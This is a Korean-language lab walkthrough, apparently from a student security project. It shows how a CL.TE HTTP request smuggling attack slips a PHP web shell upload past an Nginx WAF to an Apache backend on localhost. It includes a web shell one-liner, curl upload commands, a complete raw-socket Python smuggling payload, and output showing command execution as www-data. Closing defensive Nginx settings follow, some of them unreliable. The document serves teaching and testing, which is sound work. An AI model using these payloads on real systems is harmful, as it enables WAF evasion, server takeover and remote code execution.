# 🎯 Request Smuggling으로 WAF 우회 실습

## 📋 목표

**Nginx WAF가 일반 업로드를 차단하지만, Request Smuggling으로 우회 가능함을 증명**

---

## 🛡️ 시나리오

```
┌─────────────────────────────────────────────────────────┐
│ Nginx (WAF)                                              │
│ - PHP 파일명 차단                                          │
│ - "shell", "backdoor" 키워드 탐지                          │
│ - system(), exec() 코드 패턴 탐지                          │
│ - Rate Limit: 1초에 2번                                   │
│ - 파일 크기 제한: 2MB                                       │
└─────────────────────────────────────────────────────────┘
                    ↓
            ┌───────┴────────┐
            │                │
    일반 요청 (차단)    Smuggled 요청 (우회)
            │                │
           ❌              ✅ Apache
```

---

## 🚀 Step 1: WAF가 적용된 Nginx 설정

### nginx_with_filter.conf 적용

```bash
# 현재 디렉토리: website2/
cd c:/Users/User/Documents/GitHub/HyundaiAutoever_ITsecurity_project4/website2

# 기존 nginx.conf 백업
cp nginx.conf nginx.conf.backup

# WAF가 적용된 설정으로 교체
cp nginx_with_filter.conf nginx.conf

# Nginx 재시작
docker-compose restart nginx

# 설정 확인
docker exec 1xinv_nginx nginx -t
```

---

## 🧪 Step 2: 일반 업로드 차단 확인

### 테스트 1: 일반 curl 업로드 (차단되어야 함)

```bash
# PHP 웹쉘 생성
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# 일반 업로드 시도
curl -v -X POST http://localhost:9000/api/submit_inquiry.php \
  -F "name=test" \
  -F "email=test@test.com" \
  -F "phone=010-1234-5678" \
  -F "category=technical" \
  -F "subject=test" \
  -F "message=test" \
  -F "image=@shell.php"
```

**예상 결과**:
```
< HTTP/1.1 403 Forbidden
< Server: nginx/1.21.0
< Content-Type: text/plain
<
Malicious filename detected
```

### 테스트 2: 다른 파일명으로 시도 (여전히 차단)

```bash
# 파일명을 innocent.php로 변경
cp shell.php innocent.php

curl -X POST http://localhost:9000/api/submit_inquiry.php \
  -F "name=test" \
  -F "email=test@test.com" \
  -F "phone=010-1234-5678" \
  -F "category=technical" \
  -F "subject=test" \
  -F "message=test" \
  -F "image=@innocent.php"
```

**예상 결과**:
```
< HTTP/1.1 403 Forbidden
<
Malicious code detected
```

**이유**: Nginx가 `system($_GET["cmd"])` 패턴을 탐지!

### 테스트 3: Rate Limit 확인

```bash
# 연속 5번 요청
for i in {1..5}; do
  curl -X POST http://localhost:9000/api/submit_inquiry.php \
    -F "name=test" \
    -F "email=test@test.com" \
    -F "phone=010-1234-5678" \
    -F "category=technical" \
    -F "subject=test" \
    -F "message=test" \
    -F "image=@innocent.php"
  echo ""
done
```

**예상 결과**:
```
요청 1-3: 403 Forbidden (코드 패턴 탐지)
요청 4-5: 429 Too Many Requests (Rate Limit)
```

---

## ✅ Step 3: Request Smuggling으로 우회

### 방법 1: Python 스크립트 (자동화)

앞서 만든 `smuggle_webshell.py` 그대로 사용:

```bash
python3 smuggle_webshell.py backdoor.php
```

**예상 결과**:
```
============================================================
  HTTP Request Smuggling - Webshell Upload
  CL.TE Attack (Nginx → Apache)
============================================================

[*] Target: localhost:9000
[*] Shell name: backdoor.php

[+] Smuggled request size: 687 bytes
[*] Connecting to server...
[+] Connected!

[*] Sending CL.TE smuggling payload...
[+] Payload sent!

[*] Waiting for response 1 (POST /)...
[+] Response 1 received (200 OK)

[*] Sending normal request to trigger smuggled payload...
[*] Waiting for response 2 (smuggled POST)...

[+] ✅ Webshell uploaded successfully!
[+] Webshell URL: http://localhost:9000/uploads/backdoor.php

[*] Testing webshell...
[+] ✅ Webshell is working!
[+] Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**성공 이유**:
1. Nginx는 `POST /`만 보고, smuggled 요청의 내용을 파싱하지 못함
2. `system()`, `shell.php` 등의 패턴이 Nginx의 검사를 우회
3. Apache가 직접 받아서 처리

### 방법 2: 수동 소켓 전송

```python
#!/usr/bin/env python3
import socket

sock = socket.socket()
sock.connect(('localhost', 9000))

# Smuggling 페이로드
payload = b"""POST / HTTP/1.1\r
Host: localhost:9000\r
Content-Length: 500\r
Transfer-Encoding: chunked\r
\r
0\r
\r
POST /api/submit_inquiry.php HTTP/1.1\r
Host: localhost:9000\r
Content-Type: multipart/form-data; boundary=----WebKitBoundary\r
Content-Length: 300\r
\r
------WebKitBoundary\r
Content-Disposition: form-data; name="name"\r
\r
smuggled\r
------WebKitBoundary\r
Content-Disposition: form-data; name="email"\r
\r
test@test.com\r
------WebKitBoundary\r
Content-Disposition: form-data; name="phone"\r
\r
010-1234-5678\r
------WebKitBoundary\r
Content-Disposition: form-data; name="category"\r
\r
technical\r
------WebKitBoundary\r
Content-Disposition: form-data; name="subject"\r
\r
test\r
------WebKitBoundary\r
Content-Disposition: form-data; name="message"\r
\r
test\r
------WebKitBoundary\r
Content-Disposition: form-data; name="image"; filename="pwned.php"\r
Content-Type: image/jpeg\r
\r
<?php system($_GET["x"]); ?>\r
------WebKitBoundary--\r
"""

sock.sendall(payload)
print(sock.recv(4096))
sock.close()
```

---

## 🔍 Step 4: 로그 분석으로 우회 확인

### Nginx 로그 (필터가 동작하지 않음)

```bash
docker exec 1xinv_nginx tail -20 /var/log/nginx/access.log
```

**출력**:
```
172.18.0.1 - - [20/Oct/2025:11:00:00 +0900] "POST / HTTP/1.1" 200 4799
172.18.0.1 - - [20/Oct/2025:11:00:01 +0900] "GET /index.php HTTP/1.1" 200 4799
```

**분석**:
- Nginx는 `POST /`만 기록
- `/api/submit_inquiry.php`가 로그에 없음 ⚠️
- WAF 필터가 적용되지 않음 ✅

### Apache 로그 (실제 업로드 발생)

```bash
docker exec 1xinv_web_v2 tail -20 /var/log/apache2/access.log
```

**출력**:
```
172.19.0.5 - - [20/Oct/2025:02:00:00 +0000] "POST / HTTP/1.1" 200 4799
172.19.0.5 - - [20/Oct/2025:02:00:01 +0000] "POST /api/submit_inquiry.php HTTP/1.1" 200 147
172.19.0.5 - - [20/Oct/2025:02:00:01 +0000] "GET /index.php HTTP/1.1" 200 4799
```

**분석**:
- Apache는 3개 요청 기록
- 중간에 `/api/submit_inquiry.php` 기록됨! ⚠️
- **Smuggling 성공 증거**

---

## 📊 결과 비교표

| 항목 | 일반 업로드 | Smuggling 업로드 |
|-----|-----------|----------------|
| **PHP 파일명 필터** | ❌ 차단됨 | ✅ 우회 |
| **코드 패턴 탐지** (system, exec) | ❌ 차단됨 | ✅ 우회 |
| **Rate Limit** | ❌ 1초 2번 제한 | ✅ 무제한 |
| **파일 크기 제한** | ❌ 2MB 제한 | ✅ 우회 가능 |
| **Nginx 로그** | ✅ 명확히 기록 | ⚠️ `POST /`만 기록 |
| **Apache 로그** | ✅ 기록됨 | ✅ 기록됨 (숨겨진 요청) |
| **WAF 탐지** | ✅ 100% 탐지 | ❌ 0% 탐지 |

---

## 💡 왜 우회가 가능한가?

### Nginx의 시각 (Content-Length 우선)

```http
POST / HTTP/1.1
Host: localhost:9000
Content-Length: 500          ← Nginx는 이것만 봄
Transfer-Encoding: chunked   ← 무시됨
```

Nginx는:
1. Content-Length: 500 보고 500바이트 읽음
2. 전체를 "하나의 요청"으로 간주
3. URI가 `POST /`이므로 WAF 규칙 적용 안 됨
4. Body를 파싱하지 않고 그대로 Apache로 전달

### Apache의 시각 (Transfer-Encoding 우선)

```http
POST / HTTP/1.1
Host: localhost:9000
Content-Length: 500          ← 무시됨
Transfer-Encoding: chunked   ← Apache는 이것 우선
```

Apache는:
1. Transfer-Encoding: chunked 우선 처리
2. `0\r\n\r\n` 발견 → 첫 요청 종료
3. 나머지 데이터를 소켓 버퍼에 저장
4. 다음 요청이 오면 버퍼의 데이터를 "새 요청"으로 처리
5. `POST /api/submit_inquiry.php`가 실행됨 (WAF 우회!)

---

## 🎯 핵심 정리

### Q: 일반 업로드를 막으면서 Smuggling은 가능한가?
**A: 네! 그게 바로 Request Smuggling의 핵심입니다.**

### 원리:
```
Nginx (WAF) : "POST /인데? 괜찮네!"
              ↓ (전체 전달)
Apache      : "POST /api/submit_inquiry.php 받았어!"
              ✅ 업로드 성공
```

### 실전 적용:
- **ModSecurity**: Nginx에서 차단 → Smuggling으로 우회
- **Cloudflare WAF**: 프론트엔드 차단 → 백엔드 직접 전달
- **AWS WAF**: ALB 차단 → EC2 직접 수신

---

## 🛡️ 방어 방법

### 완전한 방어:

```nginx
# nginx.conf
server {
    # Transfer-Encoding과 Content-Length 동시 존재 시 거부
    if ($http_transfer_encoding != "") {
        if ($http_content_length != "") {
            return 400;
        }
    }

    # Transfer-Encoding 헤더 제거
    proxy_set_header Transfer-Encoding "";

    # HTTP/2 강제 (Smuggling 불가)
    listen 443 ssl http2;
    http2_push_preload on;
}
```

### 부분 방어:

```nginx
# 백엔드 연결 재사용 비활성화
proxy_http_version 1.0;
proxy_set_header Connection "close";
```

---

## 🎓 교훈

**"프론트엔드 보안 ≠ 전체 보안"**

- Nginx WAF가 아무리 강력해도
- 백엔드와 HTTP 파싱이 다르면
- Request Smuggling으로 우회 가능

**진짜 보안 = End-to-End 검증!** 🔒
